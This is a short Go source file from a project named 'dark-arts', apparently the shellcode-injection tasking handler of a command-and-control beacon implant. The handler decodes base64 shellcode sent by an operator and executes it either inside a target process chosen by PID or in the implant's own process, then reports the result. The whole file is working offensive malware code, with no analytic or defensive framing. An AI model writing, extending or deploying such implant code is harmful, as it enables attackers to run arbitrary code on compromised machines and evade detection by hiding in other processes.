//go:build inject

package beacon

import (
	"encoding/base64"
	"encoding/json"

	"dark-arts/pkg/inject"
	"dark-arts/pkg/tasking"
)

func (e *Executor) runInject(payload []byte, res *tasking.Result) {
	var p struct {
		Data string `json:"data"`
		PID  int    `json:"pid"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		res.Error = err.Error()
		return
	}
	sc, err := base64.StdEncoding.DecodeString(p.Data)
	if err != nil {
		res.Error = err.Error()
		return
	}
	var r *inject.Result
	if p.PID > 0 {
		r, err = inject.RemoteRun(sc, uint32(p.PID))
	} else {
		r, err = inject.SelfRun(sc)
	}
	if err != nil {
		res.Error = err.Error()
		return
	}
	out, err := json.Marshal(r)
	if err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = out
}
